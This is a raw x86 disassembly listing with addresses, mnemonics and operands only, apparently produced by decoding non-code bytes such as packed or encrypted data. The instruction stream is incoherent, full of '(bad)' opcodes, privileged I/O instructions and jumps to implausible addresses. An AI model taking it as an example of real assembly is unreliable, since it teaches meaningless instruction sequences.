  41b2b7:	sbb    edx,esi
  41b2b9:	imul   edx,edi,0x372d7a91
  41b2bf:	pop    ebx
  41b2c0:	jne    0x41b24f
  41b2c2:	ss xchg ecx,eax
  41b2c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2c5:	arpl   di,si
  41b2c7:	je     0x41b291
  41b2c9:	xor    eax,0xb0c32e62
  41b2ce:	jge    0x41b2ab
  41b2d0:	inc    edi
  41b2d1:	add    al,0x2d
  41b2d3:	int    0xf9
  41b2d5:	xlat   BYTE PTR ds:[ebx]
  41b2d6:	dec    edi
  41b2d7:	jo     0x41b2d5
  41b2d9:	gs jl  0x41b313
  41b2dc:	mov    cl,0x75
  41b2de:	add    eax,0x8068a172
  41b2e3:	xor    eax,0xf0ec1cfc
  41b2e8:	adc    eax,0x83cbb6f9
  41b2ed:	nop
  41b2ee:	adc    ebx,DWORD PTR [eax]
  41b2f0:	and    eax,0x51587135
  41b2f5:	mov    ebp,0x68a4c597
  41b2fa:	clc    
  41b2fb:	or     BYTE PTR [ecx],cl
  41b2fd:	jo     0x41b295
  41b2ff:	leave  
  41b300:	ja     0x41b34b
  41b302:	aad    0x28
  41b304:	pop    ss
  41b305:	xchg   ecx,eax
  41b306:	mov    dh,0x9b
  41b308:	xchg   esi,eax
  41b309:	sbb    ebx,esp
  41b30b:	imul   ebp,DWORD PTR [ecx+0x6e3ae28c],0xffffff87
  41b312:	pop    edi
  41b313:	scas   eax,DWORD PTR es:[edi]
  41b314:	cmp    al,0xa9
  41b316:	xchg   ebp,eax
  41b317:	ror    edi,cl
  41b319:	mov    eax,0x20db86d4
  41b31e:	pop    esp
  41b31f:	pop    edx
  41b320:	imul   ecx,ebx,0x37a792fa
  41b326:	push   edi
  41b327:	push   ebx
  41b328:	sbb    DWORD PTR [ecx-0xce32c61],esi
  41b32e:	in     eax,0xed
  41b330:	jecxz  0x41b384
  41b332:	pop    esp
  41b333:	stc    
  41b334:	std    
  41b335:	sub    DWORD PTR [ecx-0x1ccc57bc],ebx
  41b33b:	clc    
  41b33c:	std    
  41b33d:	xor    ecx,ebx
  41b33f:	xor    BYTE PTR [edx-0x37],0x5e
  41b343:	gs pop esp
  41b345:	pusha  
  41b346:	sbb    bl,BYTE PTR [eax+0x1d]
  41b349:	add    esi,0xd8236c94
  41b34f:	push   ebx
  41b350:	or     al,0x1
  41b352:	mov    dh,0x65
  41b354:	mov    ch,0xbb
  41b356:	dec    ebp
  41b357:	mov    ch,0x3c
  41b359:	sahf   
  41b35a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b35b:	lea    eax,ds:0x389ae16c
  41b361:	xor    al,0xd
  41b363:	loop   0x41b3a4
  41b365:	pusha  
  41b366:	cwde   
  41b367:	ds sub ch,bh
  41b36a:	stos   BYTE PTR es:[edi],al
  41b36b:	(bad)  
  41b36c:	stc    
  41b36d:	outs   dx,BYTE PTR ds:[esi]
  41b36e:	(bad)  
  41b36f:	mov    eax,DWORD PTR [ebx+0x44e5f664]
  41b375:	xchg   esi,eax
  41b376:	mov    bh,0xe
  41b378:	adc    ah,bl
  41b37a:	inc    eax
  41b37b:	call   DWORD PTR [esi]
  41b37d:	mov    bh,0x4d
  41b37f:	or     dl,ah
  41b381:	xor    eax,DWORD PTR [edi+0x46154829]
  41b387:	xchg   esp,eax
  41b388:	lea    edx,[ebx-0x62b4e408]
  41b38e:	das    
  41b38f:	adc    edx,0xffffffbd
  41b392:	add    eax,0x8b1ae8d2
  41b397:	push   ds
  41b398:	iret   
  41b399:	pop    esp
  41b39a:	imul   edi,DWORD PTR [ebp*4-0x39ec0188],0x3b3b3b2
  41b3a5:	mov    dh,0x79
  41b3a7:	jno    0x41b3cc
  41b3a9:	mov    cl,0x3d
  41b3ab:	dec    eax
  41b3ac:	je     0x41b34f
  41b3ae:	inc    edx
  41b3af:	stos   DWORD PTR es:[edi],eax
  41b3b0:	pcmpeqb mm7,QWORD PTR [edi]
  41b3b3:	(bad)  
  41b3b4:	pop    edx
  41b3b5:	and    al,0x97
  41b3b7:	into   
  41b3b8:	xor    edi,DWORD PTR [ebp-0x6a]
  41b3bb:	enter  0x12fa,0x83
  41b3bf:	retf   
  41b3c0:	pop    eax
  41b3c1:	xor    eax,DWORD PTR [edx+0x2da09]
  41b3c7:	adc    cl,bh
  41b3c9:	int    0xe7
  41b3cb:	out    0x6f,al
  41b3cd:	aad    0x70
  41b3cf:	popf   
  41b3d0:	clc    
  41b3d1:	int3   
  41b3d2:	adc    dh,dl
  41b3d4:	aam    0x2d
  41b3d6:	xor    bh,ch
  41b3d8:	rcr    DWORD PTR [edx+0x3bc2b7ab],0xf8
  41b3df:	dec    edi
  41b3e0:	mov    ds:0xae6df520,al
  41b3e5:	sub    al,0x66
  41b3e7:	mov    BYTE PTR [edx-0x8],cl
  41b3ea:	mov    al,0x50
  41b3ec:	cdq    
  41b3ed:	(bad)  
  41b3ee:	in     eax,0xa4
  41b3f0:	or     BYTE PTR [eax-0x393bdfc8],ah
  41b3f6:	xchg   DWORD PTR [esi+0x2a8d6747],ebx
  41b3fc:	cmp    BYTE PTR [eax-0x58],cl
  41b3ff:	je     0x41b3b7
  41b401:	jbe    0x41b44e
  41b403:	xchg   BYTE PTR [edi-0x4ecbfd73],ah
  41b409:	and    bl,BYTE PTR [ecx+0x67]
  41b40c:	(bad)  
  41b40d:	dec    esi
  41b40e:	cmp    ch,BYTE PTR [edx]
  41b410:	xor    eax,0x8f7965e
  41b415:	and    edx,DWORD PTR [ebx+edi*4-0x1a]
  41b419:	in     al,dx
  41b41a:	inc    esp
  41b41b:	into   
  41b41c:	pop    ss
  41b41d:	aad    0x5
  41b41f:	push   esi
  41b420:	call   0x8b03100b
  41b425:	(bad)  
  41b426:	jne    0x41b3e2
  41b428:	inc    eax
  41b429:	sti    
  41b42a:	inc    ebp
  41b42b:	lods   eax,DWORD PTR ds:[esi]
  41b42c:	(bad)  
  41b42d:	ins    DWORD PTR es:[edi],dx
  41b42e:	jg     0x41b40f
  41b430:	xlat   BYTE PTR ds:[ebx]
  41b431:	or     bh,BYTE PTR [eax-0x22cb6152]
  41b437:	retf   0xa360
  41b43a:	pusha  
  41b43b:	push   esp
  41b43c:	fdivr  st(3),st
  41b43e:	inc    ebp
  41b43f:	popf   
  41b440:	pop    es
  41b441:	shl    BYTE PTR [eax-0xc],1
  41b444:	call   0xa3a2:0xf87d64a2
  41b44b:	xchg   ecx,eax
  41b44c:	add    ch,dl
  41b44e:	rcl    BYTE PTR [edi],1
  41b450:	push   ss
  41b451:	cmp    ecx,DWORD PTR [ebp-0x6a]
  41b454:	cmp    al,0xab
  41b456:	idiv   DWORD PTR [edi-0x4]
  41b459:	push   cs
  41b45a:	inc    ebp
  41b45b:	inc    esp
  41b45c:	fild   DWORD PTR [esi]
  41b45e:	push   cs
  41b45f:	dec    ebp
  41b460:	xchg   edx,eax
  41b461:	out    dx,eax
  41b462:	cmp    esi,DWORD PTR [ebx+0x1d]
  41b465:	shl    DWORD PTR [esi+0xd24ced7],cl
  41b46b:	dec    ebx
  41b46c:	iret   
  41b46d:	out    dx,eax
  41b46e:	jns    0x41b48a
  41b470:	pop    esi
  41b471:	test   cl,0x85
  41b474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b475:	mov    al,BYTE PTR [edi]
  41b477:	push   ecx
  41b478:	pop    esp
  41b479:	dec    ecx
  41b47a:	xchg   ecx,eax
  41b47b:	in     al,dx
  41b47c:	ds push eax
  41b47e:	cmp    dh,al
  41b480:	inc    ebp
  41b481:	adc    esi,DWORD PTR [esi-0x6e93118a]
  41b487:	adc    eax,0x89508146
  41b48c:	sbb    al,0x33
  41b48e:	push   es
  41b48f:	cmp    al,0x29
  41b491:	lea    eax,[eax]
  41b493:	mov    bl,0xf8
  41b495:	and    ecx,DWORD PTR [ecx+ebx*4-0x7d]
  41b499:	cld    
  41b49a:	or     al,BYTE PTR [ecx]
  41b49c:	xor    ebp,DWORD PTR [edx+0x2b2b6c14]
  41b4a2:	leave  
  41b4a3:	xchg   esp,eax
  41b4a4:	cs adc esi,ebx
  41b4a7:	iret   
  41b4a8:	xor    eax,0xa673044d
  41b4ad:	sub    al,0xfb
  41b4af:	mov    ah,0xda
  41b4b1:	xchg   esi,eax
  41b4b2:	mov    al,0xd5
  41b4b4:	or     al,0xf2
  41b4b6:	jmp    0x4928a4fb
  41b4bb:	add    DWORD PTR [ebx+0x2c],edx
  41b4be:	mov    esp,0x14becd9b
  41b4c3:	xchg   DWORD PTR [edi+ebp*2],ecx
  41b4c6:	xchg   esp,eax
  41b4c7:	dec    ebx
  41b4c8:	jns    0x41b536
  41b4ca:	xchg   edx,eax
  41b4cb:	push   ecx
  41b4cc:	sbb    DWORD PTR [edx],esi
  41b4ce:	gs pop esi
  41b4d0:	cmp    ch,dh
  41b4d2:	inc    edi
  41b4d3:	xchg   ebp,eax
  41b4d4:	adc    eax,0x283b2ade
  41b4d9:	jmp    FWORD PTR [esi]
  41b4db:	inc    ecx
  41b4dc:	cmp    eax,0xb6e0fb8a
  41b4e1:	sub    eax,0xf3f8d4af
  41b4e6:	ret    
  41b4e7:	pop    ds
  41b4e8:	(bad)  
  41b4e9:	in     al,dx
  41b4ea:	(bad)  
  41b4eb:	mov    bh,0xf0
  41b4ed:	and    dl,al
  41b4ef:	ret    
  41b4f0:	and    eax,0x6b970217
  41b4f5:	cmp    al,0xda
  41b4f7:	and    edx,DWORD PTR [ebx-0x6f]
  41b4fa:	pushf  
  41b4fb:	mov    BYTE PTR [edx],0xa3
  41b4fe:	mov    ah,0xfe
  41b500:	sbb    ecx,DWORD PTR [ebx]
  41b502:	cmp    dh,BYTE PTR [edi*2+0x1b7b5d02]
  41b509:	push   ebx
  41b50a:	jne    0x41b4e7
  41b50c:	or     al,0x97
  41b50e:	int    0x57
  41b510:	(bad)  
  41b511:	fild   WORD PTR [eax+0x15]
  41b514:	jp     0x41b562
  41b516:	test   al,0x9
  41b518:	xchg   ecx,eax
  41b519:	adc    ecx,ebx
  41b51b:	(bad)  
  41b51c:	mov    eax,0x7d509b52
  41b521:	xchg   edx,eax
  41b522:	sbb    al,BYTE PTR [ebp-0x3e]
  41b525:	div    DWORD PTR [eax]
  41b527:	cmp    dl,ch
  41b529:	xor    bh,BYTE PTR [ebx+0x2781b6fc]
  41b52f:	cmp    ebx,DWORD PTR [edi+eiz*8-0x6a]
  41b533:	dec    ecx
  41b534:	pop    esi
  41b535:	out    0xd5,eax
  41b537:	xor    DWORD PTR [ebx],ebx
  41b539:	fwait
  41b53a:	push   ss
  41b53b:	ret    0x37ff
  41b53e:	pop    eax
  41b53f:	push   ds
  41b540:	test   ebp,edx
  41b542:	push   edx
  41b543:	icebp  
  41b544:	icebp  
  41b545:	popf   
  41b546:	inc    ebx
  41b547:	gs loop 0x41b580
  41b54a:	sbb    bh,BYTE PTR [edi+0x2cd58659]
  41b550:	push   ebx
  41b551:	stos   BYTE PTR es:[edi],al
  41b552:	leave  
  41b553:	sub    BYTE PTR [eax],ah
  41b555:	mov    eax,DWORD PTR [eax]
  41b557:	cdq    
  41b558:	adc    bh,bh
  41b55a:	or     ecx,DWORD PTR [ebx+0x632dc807]
  41b560:	sbb    eax,0xc8909142
  41b565:	loopne 0x41b545
  41b567:	push   cs
  41b568:	sub    al,0xca
  41b56a:	or     edx,DWORD PTR [esi-0x55d9a9c]
  41b570:	leave  
  41b571:	mov    cl,0xff
  41b573:	call   0x5e534d3d
  41b578:	xchg   edx,eax
  41b579:	jg     0x41b5c5
  41b57b:	fiadd  DWORD PTR [ecx+0x1a5b8cea]
  41b581:	push   ds
  41b582:	imul   edx,edi,0xc6d59fcf
  41b588:	xchg   BYTE PTR [ebp+ebp*8+0x2],ah
  41b58c:	and    eax,0xd85e3af7
  41b591:	mov    edi,0xab8919e8
  41b596:	ds cwde 
  41b598:	xor    BYTE PTR [esi-0x47],bh
  41b59b:	pop    ecx
  41b59c:	xchg   edx,eax
  41b59d:	push   0xdbb89a6d
  41b5a2:	(bad)  
  41b5a4:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5a6:	stos   DWORD PTR es:[edi],eax
  41b5a7:	mov    eax,0x86861db4
  41b5ac:	adc    al,0xf0
  41b5ae:	dec    ecx
  41b5af:	(bad)  [ecx]
  41b5b1:	leave  
  41b5b2:	rcl    DWORD PTR [esi],cl
  41b5b4:	and    edi,ebp
  41b5b6:	mul    BYTE PTR [ecx]
  41b5b8:	adc    BYTE PTR [eax+0x5829898],bl
  41b5be:	push   esi
  41b5bf:	push   ecx
  41b5c0:	push   edi
  41b5c1:	and    al,0x39
  41b5c3:	aaa    
  41b5c4:	iret   
  41b5c5:	scas   eax,DWORD PTR es:[edi]
  41b5c6:	mov    ebx,0xc5c263ff
  41b5cb:	repnz inc edi
  41b5cd:	es (bad) 
  41b5cf:	pop    ecx
  41b5d0:	imul   BYTE PTR [ebp+0x22d0169]
  41b5d6:	(bad)  
  41b5d7:	fcmovu st,st(2)
  41b5d9:	jle    0x41b55b
  41b5db:	ins    BYTE PTR es:[edi],dx
  41b5dc:	(bad)  
  41b5dd:	ficomp DWORD PTR [eax+0x23c73a86]
  41b5e3:	mov    ds:0x9dde69af,eax
  41b5e8:	mov    eax,ds:0x7c7fd68d
  41b5ed:	ss push 0x43
  41b5f0:	fwait
  41b5f1:	lahf   
  41b5f2:	sbb    dh,BYTE PTR [eax]
  41b5f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5f5:	sub    ch,BYTE PTR [edi-0x4d]
  41b5f8:	inc    esi
  41b5f9:	fwait
  41b5fa:	mov    DWORD PTR [edx-0x25],ebx
  41b5fd:	mov    dl,0xbe
  41b5ff:	jo     0x41b67a
  41b601:	loopne 0x41b654
  41b603:	out    dx,eax
  41b604:	ja     0x41b594
  41b606:	inc    ebx
  41b607:	pop    ds
  41b608:	pop    ss
  41b609:	(bad)  
  41b60a:	scas   eax,DWORD PTR es:[edi]
  41b60b:	mov    ?,WORD PTR [ebp-0x7c]
  41b60e:	outs   dx,DWORD PTR ds:[esi]
  41b60f:	dec    ebp
  41b610:	iret   
  41b611:	cli    
  41b612:	leave  
  41b613:	push   ebx
  41b614:	rcr    BYTE PTR [edx+0x3b],1
  41b617:	repz bswap ebx
  41b61a:	aad    0xe7
  41b61c:	and    al,0xe0
  41b61e:	pop    eax
  41b61f:	nop
  41b620:	mov    ah,0x68
  41b622:	mov    ebp,edx
  41b624:	or     al,0xf7
  41b626:	and    esi,DWORD PTR [ecx+ebp*8]
  41b629:	call   FWORD PTR [eax]
  41b62b:	xor    eax,0x26e1b297
  41b630:	lods   al,BYTE PTR ds:[esi]
  41b631:	rep stos BYTE PTR es:[edi],al
  41b633:	jmp    0x41b610
  41b635:	and    DWORD PTR [ecx-0x7c9d9341],edx
  41b63b:	xor    eax,0x7efff837
  41b640:	adc    DWORD PTR [edi+0x3693a854],ebx
  41b646:	rcl    BYTE PTR [eax-0x1d],cl
  41b649:	adc    ah,BYTE PTR [edx+0x347b1d94]
  41b64f:	push   0x949ba46a
  41b654:	int    0x50
  41b656:	dec    ecx
  41b657:	(bad)  
  41b65a:	mov    bl,0x4e
  41b65c:	loopne 0x41b659
  41b65e:	xor    al,0xb1
  41b660:	push   esp
  41b661:	out    dx,al
  41b662:	daa    
  41b663:	mov    cl,0xb5
  41b665:	(bad)
  41b668:	outs   dx,BYTE PTR ds:[esi]
  41b669:	out    0xfb,eax
  41b66b:	push   ebx
  41b66c:	sbb    eax,0x9599ac5
  41b671:	jns    0x41b6e0
  41b673:	or     al,0xed
  41b675:	push   edi
  41b676:	sbb    ah,bl
  41b678:	push   es
  41b679:	into   
  41b67a:	jecxz  0x41b60e
  41b67c:	mov    ebp,0x654bc8d
  41b681:	test   DWORD PTR [edi],edx
  41b683:	mov    edi,0x1630eac7
  41b688:	clc    
  41b689:	xchg   ebp,eax
  41b68a:	sbb    ebx,esp
  41b68c:	ss data16 jp 0x41b6e2
  41b690:	xchg   ebx,eax
  41b691:	push   ebp
  41b692:	clc    
  41b693:	mov    bh,0xe4
  41b695:	jl     0x41b67a
  41b697:	pop    esp
  41b698:	retf   
  41b699:	jnp    0x41b67f
  41b69b:	dec    ebx
  41b69c:	repz sti 
  41b69e:	xor    BYTE PTR [edx+0x2a597f8],0xb7
  41b6a5:	dec    ebx
  41b6a6:	fwait
  41b6a7:	ja     0x41b663
  41b6a9:	lahf   
  41b6aa:	loopne 0x41b6de
  41b6ac:	or     ch,ah
  41b6ae:	xor    bh,bh
  41b6b0:	inc    edx
  41b6b1:	xor    BYTE PTR [ebp+0x5cb51f73],bl
  41b6b7:	fisubr DWORD PTR [edi]
  41b6b9:	sub    BYTE PTR [esi+0xb],ah
  41b6bc:	pop    edx
  41b6bd:	mov    bh,0xa
  41b6bf:	fwait
  41b6c0:	jmp    DWORD PTR ds:0x76f6ce0f
  41b6c6:	sub    DWORD PTR [edx],esp
  41b6c8:	jne    0x41b6fd
  41b6ca:	mov    ebp,0x58540b2
  41b6cf:	test   DWORD PTR [eax],edx
  41b6d1:	enter  0x584b,0x8b
  41b6d5:	sub    ch,BYTE PTR [edx]
  41b6d7:	call   0x507b:0xd8fdbf3e
  41b6de:	outs   dx,DWORD PTR ds:[esi]
  41b6df:	and    esi,esi
  41b6e1:	js     0x41b6ae
  41b6e3:	arpl   WORD PTR [edi+0x16],ax
  41b6e6:	addr16 pop es
  41b6e8:	mov    dh,0x36
  41b6ea:	std    
  41b6eb:	mov    edi,0x7f625f80
  41b6f0:	mov    esi,0x9906f1a0
  41b6f5:	(bad)  
  41b6f6:	mov    ecx,0x24c83ba4
  41b6fb:	(bad)  
  41b6fc:	mov    al,ds:0xa23b46d2
  41b701:	(bad)  [esi-0x5d]
  41b704:	and    dh,BYTE PTR [edi+ebx*2]
  41b707:	scas   al,BYTE PTR es:[edi]
  41b708:	mov    ds,WORD PTR [eax-0x8]
  41b70b:	push   ds
  41b70c:	push   esi
  41b70d:	out    0x9b,al
  41b70f:	sub    BYTE PTR [edx+ebx*1-0x35],0x7d
  41b714:	ja     0x41b6db
  41b716:	test   al,0xc5
  41b718:	sub    eax,DWORD PTR [edi-0x37]
  41b71b:	xlat   BYTE PTR ds:[ebx]
  41b71c:	jp     0x41b764
  41b71e:	imul   esp,DWORD PTR [ebp-0x22],0x2
  41b722:	push   edx
  41b723:	lods   al,BYTE PTR ds:[esi]
  41b724:	out    0x8e,eax
  41b726:	out    0x8a,al
  41b728:	adc    BYTE PTR [eax-0x2eff4031],dh
  41b72e:	push   ds
  41b72f:	imul   ebx,DWORD PTR [edi+0x30],0xe680d3c4
  41b736:	adc    BYTE PTR [ebp-0x74],al
  41b739:	popa   
  41b73a:	call   0x99fd:0xcbf2089b
  41b741:	int3   
  41b742:	call   0x1a0b:0xb18b91b9
  41b749:	inc    ecx
  41b74a:	mov    WORD PTR [edx-0x1d],?
  41b74d:	in     eax,0x54
  41b74f:	sbb    eax,0xbd73c54e
  41b754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b755:	sbb    al,0xed
  41b757:	cmp    DWORD PTR [ecx+ecx*2],eax
  41b75a:	and    DWORD PTR [esi],0xffffffb9
  41b75d:	cmp    BYTE PTR [eax+0x38],0x94
  41b761:	(bad)  
  41b762:	and    BYTE PTR [di-0x37c4],al
  41b767:	adc    dh,BYTE PTR [edi]
  41b769:	fs cmp eax,0xebfbc350
  41b76f:	int3   
  41b770:	xlat   BYTE PTR ds:[ebx]
  41b771:	imul   edi,esi,0x7386cc15
  41b777:	dec    edi
  41b778:	add    eax,edi
  41b77a:	xor    bl,BYTE PTR [ecx-0xe]
  41b77d:	jnp    0x41b728
  41b77f:	test   eax,ebx
  41b781:	retf   
  41b782:	popa   
  41b783:	pop    esp
  41b784:	int    0x4e
  41b786:	pop    esi
  41b787:	pushf  
  41b788:	or     bh,dh
  41b78a:	fwait
  41b78b:	aaa    
  41b78c:	addr16 inc ebp
  41b78e:	adc    al,0xcc
  41b790:	gs jecxz 0x41b770
  41b793:	jge    0x41b7fb
  41b795:	dec    esp
  41b796:	shl    BYTE PTR [ebx+0x3884d0d9],1
  41b79c:	ins    DWORD PTR es:[edi],dx
  41b79d:	push   es
  41b79e:	int3   
  41b79f:	dec    ebp
  41b7a0:	sub    al,0xa2
  41b7a2:	outs   dx,BYTE PTR ds:[esi]
  41b7a3:	scas   al,BYTE PTR es:[edi]
  41b7a4:	pusha  
  41b7a5:	aam    0xd6
  41b7a7:	enter  0xaeab,0xa0
  41b7ab:	add    esp,DWORD PTR es:[eax]
  41b7ae:	test   eax,0xdbbfeb28
  41b7b3:	cmp    ecx,DWORD PTR [ebp-0xd]
  41b7b6:	dec    ebp
  41b7b7:	fidivr WORD PTR [ebp+0x45]
  41b7ba:	sbb    al,0x17
  41b7bc:	clc    
  41b7bd:	(bad)  
  41b7be:	out    0x6e,al
  41b7c0:	and    DWORD PTR gs:[edx+0x8ee9cb5],esp
  41b7c7:	inc    esi
  41b7c8:	push   cs
  41b7c9:	ret    
  41b7ca:	dec    ecx
  41b7cb:	sub    esi,DWORD PTR [edx]
  41b7cd:	pop    es
  41b7ce:	fdivr  QWORD PTR [esi-0x9]
  41b7d1:	jmp    0xa49e8f57
  41b7d6:	cdq    
  41b7d7:	mov    edi,0xa70a6b71
  41b7dc:	sub    al,0xfa
  41b7de:	test   ah,dh
  41b7e0:	lock cwde 
  41b7e2:	out    dx,al
  41b7e3:	mov    eax,ds:0x67e1b550
  41b7e8:	jle    0x41b807
  41b7ea:	pop    edx
  41b7eb:	fs loopne 0x41b7cc
  41b7ee:	sub    eax,0x6a42d5bb
  41b7f3:	inc    esi
  41b7f4:	inc    edi
  41b7f5:	aad    0x55
  41b7f7:	popa   
  41b7f8:	outs   dx,BYTE PTR ds:[esi]
  41b7f9:	mov    cl,0x80
  41b7fb:	sbb    ebx,DWORD PTR [eax+eiz*8+0x1fc5d0e3]
  41b802:	and    ebp,esp
  41b804:	rcr    BYTE PTR [ebx+0xb],cl
  41b807:	push   0xffffffb0
  41b809:	pop    esi
  41b80a:	adc    al,0x8f
  41b80c:	xchg   edi,eax
  41b80d:	add    ch,BYTE PTR [ebx-0x56]
  41b810:	(bad)  
  41b811:	aad    0xe8
  41b813:	dec    esp
  41b814:	adc    BYTE PTR [edi-0x38ae4aef],dl
  41b81a:	(bad)  
  41b81b:	cli    
  41b81c:	lea    ebx,[edi+0x3]
  41b81f:	xchg   BYTE PTR [eax-0x1d],bh
  41b822:	xchg   BYTE PTR [eax-0xb],cl
  41b825:	das    
  41b826:	cdq    
  41b827:	mov    edi,edx
  41b829:	xchg   esp,ebp
  41b82b:	(bad)  
  41b82d:	jbe    0x41b803
  41b82f:	fisubr DWORD PTR [eax+0x6a]
  41b832:	cwde   
  41b833:	dec    ebp
  41b834:	cmp    DWORD PTR [edx+0x5d],edi
  41b837:	push   ebp
  41b838:	jge    0x41b7ba
  41b83a:	inc    ecx
  41b83b:	push   es
  41b83c:	retf   
  41b83d:	dec    ebx
  41b83e:	pop    ss
  41b83f:	repz inc ebx
  41b841:	es test eax,0x8558236
  41b847:	inc    esi
  41b848:	mov    esi,0xb620c3f7
  41b84d:	fild   WORD PTR [edi]
  41b84f:	cmp    esi,DWORD PTR [edi+ebx*2+0x4]
  41b853:	and    dl,ah
  41b855:	int3   
  41b856:	mov    DWORD PTR [esi+0x3],edx
  41b859:	inc    eax
  41b85a:	(bad)  
  41b85b:	jmp    0x7354ee8a
  41b860:	jne    0x41b832
  41b862:	retf   0x8edb
  41b865:	popa   
  41b866:	xchg   esi,eax
  41b867:	mov    bl,0x7e
  41b869:	shr    DWORD PTR [edi-0x37db9478],1
  41b86f:	push   ebp
  41b870:	xchg   DWORD PTR [edx+0x34],esi
  41b873:	mov    DWORD PTR [esp+eax*8],ebx
  41b876:	jl     0x41b8b6
  41b878:	lods   eax,DWORD PTR ds:[esi]
  41b879:	pop    edi
  41b87a:	push   edi
  41b87b:	mov    ch,0x7e
  41b87d:	das    
  41b87e:	xor    eax,0x81b423bf
  41b883:	ficom  DWORD PTR [ecx]
  41b885:	mov    bh,0x78
  41b887:	lods   eax,DWORD PTR ds:[esi]
  41b888:	inc    eax
  41b889:	push   esp
  41b88a:	fisttp DWORD PTR [ecx+edx*4]
  41b88d:	push   es
  41b88e:	sub    eax,0x869740d4
  41b893:	xchg   ebp,eax
  41b894:	std    
  41b895:	aas    
  41b896:	aad    0x95
  41b898:	in     al,dx
  41b899:	inc    esi
  41b89a:	mov    edx,ebx
  41b89c:	mov    WORD PTR [edx+eax*8],es
  41b89f:	iret   
  41b8a0:	popf   
  41b8a1:	pop    eax
  41b8a2:	aad    0x26
  41b8a4:	imul   eax,DWORD PTR [edi],0xc54684f2
  41b8aa:	loopne 0x41b89c
  41b8ac:	xor    edx,DWORD PTR [edi]
  41b8ae:	mov    BYTE PTR [esi+0x16fa3763],dh
  41b8b4:	dec    edx
  41b8b5:	in     al,dx
  41b8b6:	test   eax,0xe0e1a7b
  41b8bb:	bound  ecx,QWORD PTR [edx+0x39]
  41b8be:	lea    ebp,[edi-0x1]
  41b8c1:	sahf   
  41b8c2:	xchg   edi,eax
  41b8c3:	imul   esp,DWORD PTR [edx-0x51de91ec],0x86277296
  41b8cd:	mov    edi,0x689a5b4a
  41b8d2:	lods   eax,DWORD PTR ds:[esi]
  41b8d3:	sbb    eax,0x2c9af371
  41b8d8:	and    BYTE PTR [edx],dh
  41b8da:	icebp  
  41b8db:	sbb    bh,BYTE PTR [esi+ebx*2-0x24]
  41b8df:	leave  
  41b8e0:	mov    cl,0x9e
  41b8e2:	ins    BYTE PTR es:[edi],dx
  41b8e3:	mov    ebx,0xab2713c2
  41b8e8:	fdivr  st(5),st
  41b8ea:	push   0x3f759bc4
  41b8ef:	xor    al,0xd7
  41b8f1:	adc    edi,DWORD PTR [ecx+0x26]
  41b8f4:	(bad)  
  41b8f5:	retf   0xeb1b
  41b8f8:	lahf   
  41b8f9:	je     0x41b91a
  41b8fb:	out    0xe5,eax
  41b8fd:	js     0x41b900
  41b8ff:	mov    bh,0xff
  41b901:	xchg   DWORD PTR [esi-0x47],esi
  41b904:	xor    eax,0xcacc73b4
  41b909:	mov    esi,0xa14b9bd3
  41b90e:	push   esp
  41b90f:	mov    al,ds:0x365049d9
  41b914:	in     al,0x79
  41b916:	push   edi
  41b917:	pop    ebx
  41b918:	push   ebp
  41b919:	fwait
  41b91a:	shl    DWORD PTR [ecx+0x45335301],0x91
  41b921:	or     ecx,DWORD PTR [eax+edx*8]
  41b924:	and    al,0xe7
  41b926:	aas    
  41b927:	mov    ebp,0xb188487e
  41b92c:	not    DWORD PTR [eax]
  41b92e:	pusha  
  41b92f:	fcomp  DWORD PTR [edx]
  41b931:	out    0xb4,eax
  41b933:	shl    BYTE PTR [ebx-0x5fa9bc87],0x5a
  41b93a:	sbb    BYTE PTR [ebx+0x738c8871],bh
  41b940:	stos   DWORD PTR es:[edi],eax
  41b941:	xor    DWORD PTR [esi],ebp
  41b943:	pop    ebx
  41b944:	xchg   ebp,eax
  41b945:	sub    al,0xed
  41b947:	inc    eax
  41b948:	(bad)  
  41b949:	and    esi,DWORD PTR [edi]
  41b94b:	retf   0xa5f2
  41b94e:	cld    
  41b94f:	aas    
  41b950:	add    edi,0xc4c22a27
  41b956:	ins    BYTE PTR es:[edi],dx
  41b957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b958:	stos   DWORD PTR es:[edi],eax
  41b959:	lea    ebp,[esi-0x24]
  41b95c:	arpl   bp,sp
  41b95e:	push   esp
  41b95f:	xor    dh,BYTE PTR [ebx+0x547b3aac]
  41b965:	dec    ecx
  41b966:	rcr    BYTE PTR [ecx],cl
  41b968:	leave  
  41b969:	mov    dl,BYTE PTR [ecx-0x5f]
  41b96c:	lock je 0x41b9d2
  41b96f:	(bad)  
  41b971:	mov    DWORD PTR [edi+0x4842a09f],eax
  41b977:	lds    esi,FWORD PTR [ecx+0x30]
  41b97a:	jbe    0x41b9f4
  41b97c:	pushf  
  41b97d:	mov    DWORD PTR [edx-0x30],ebx
  41b980:	lahf   
  41b981:	mov    WORD PTR [edx],fs
  41b983:	aaa    
  41b984:	push   ds
  41b985:	and    al,0x46
  41b987:	inc    esi
  41b988:	or     al,0x18
  41b98a:	std    
  41b98b:	outs   dx,BYTE PTR ds:[esi]
  41b98c:	xchg   esp,eax
  41b98d:	sub    al,0xd3
  41b98f:	das    
  41b990:	ja     0x41b937
  41b992:	shl    DWORD PTR [esi+0x89b23b1],1
  41b998:	mov    cs,WORD PTR [esi]
  41b99a:	hlt    
  41b99b:	loop   0x41b961
  41b99d:	jecxz  0x41ba1b
  41b99f:	add    DWORD PTR [ebp-0x5c9a3568],edi
  41b9a5:	push   edi
  41b9a6:	repz ret 
  41b9a8:	into   
  41b9a9:	les    edi,FWORD PTR [esi+0x6f]
  41b9ac:	addr16 push cs
  41b9ae:	jne    0x41b991
  41b9b0:	and    esp,0x461909b7
  41b9b6:	lds    ebx,FWORD PTR [edx+0xe]
  41b9b9:	cmp    al,0xf0
  41b9bb:	aas    
  41b9bc:	scas   al,BYTE PTR es:[edi]
  41b9bd:	inc    esp
  41b9be:	sbb    al,0xa2
  41b9c0:	and    eax,0xf746f128
  41b9c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9c6:	out    dx,eax
  41b9c7:	cwde   
  41b9c8:	mov    ch,0xc1
  41b9ca:	cs pop es
  41b9cc:	dec    esp
  41b9cd:	or     eax,0x6e11e670
  41b9d2:	and    dl,BYTE PTR [edi+edx*2]
